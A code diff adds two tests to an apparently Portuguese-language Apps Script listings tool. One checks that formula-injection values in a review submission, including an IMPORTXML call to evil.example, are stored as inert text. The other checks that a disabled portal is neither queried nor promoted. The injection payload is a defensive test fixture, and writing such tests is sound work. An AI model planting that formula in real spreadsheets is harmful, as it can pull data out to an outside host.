@@ -1024,3 +1024,39 @@ test('mesmo anúncio criado com outro listing_id durante a busca não é anexado
   assert.match(cand.reject_reason, /já existe em LISTINGS \(LIST_ADMIN_77\)/);
   assert.equal(table(sandbox, 'LISTING_EVENTS').length, 0);
 });
+
+// --- revisão do PR #182, rodada 6 ---------------------------------------------------------------
+
+test('review_candidate: motivo e editor que começam com = viram texto na fila e no CHANGE_LOG', () => {
+  const base = sheets({ searches: [] });
+  base.LISTING_CANDIDATES = [CAND_COLUMNS, candRow({ candidate_id: 'C1', source_url: NEW_1, external_id: '1400001' })];
+  const sandbox = createAppsScriptSandbox({ sheets: base, scriptProperties: { ADMIN_TOKEN: 't', DATASET_VERSION: '1' } });
+  const res = post(sandbox.context, {
+    token: 't', action: 'review_candidate', candidate_id: 'C1', decision: 'rejected',
+    reason: '=IMPORTXML("https://evil.example","//a")', editor: '+SUM(1)',
+  });
+  assert.equal(res.ok, true);
+  const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
+  assert.equal(sandbox.sheets.LISTING_CANDIDATES._rows[1][header.indexOf('reject_reason')], `'=IMPORTXML("https://evil.example","//a")`);
+  const log = sandbox.sheets.CHANGE_LOG._rows.at(-1);
+  assert.equal(log[6], "'+SUM(1)", 'editor no log de auditoria é texto');
+});
+
+test('portal desligado em LISTING_SOURCES: candidato dele não é lido nem promovido', () => {
+  const base = sheets({ searches: [] });
+  base.LISTING_SOURCES[1][3] = false; // DFImoveis: active = FALSE
+  base.LISTING_CANDIDATES = [CAND_COLUMNS,
+    candRow({ candidate_id: 'C_PEND', source_url: NEW_1, external_id: '1400001' }),
+    candRow({ candidate_id: 'C_APP', source_url: NEW_2, external_id: '1400002', asking_price_brl: 700000, area_m2: 70,
+      bedrooms: 3, status: 'approved', raw_json: JSON.stringify({ read_attempts: 5 }) }),
+  ];
+  const sandbox = createAppsScriptSandbox({ sheets: base });
+  const calls = network(sandbox.context, {});
+  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
+  assert.deepEqual(calls, [], 'nenhuma requisição ao portal desligado');
+  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400002, undefined, 'nem o aprovado à mão entra');
+  const cands = Object.fromEntries(table(sandbox, 'LISTING_CANDIDATES').map((c) => [c.candidate_id, c]));
+  assert.equal(cands.C_PEND.status, 'pending');
+  assert.equal(cands.C_APP.status, 'approved');
+  assert.match(cands.C_APP.reject_reason, /portal desativado em LISTING_SOURCES/);
+});
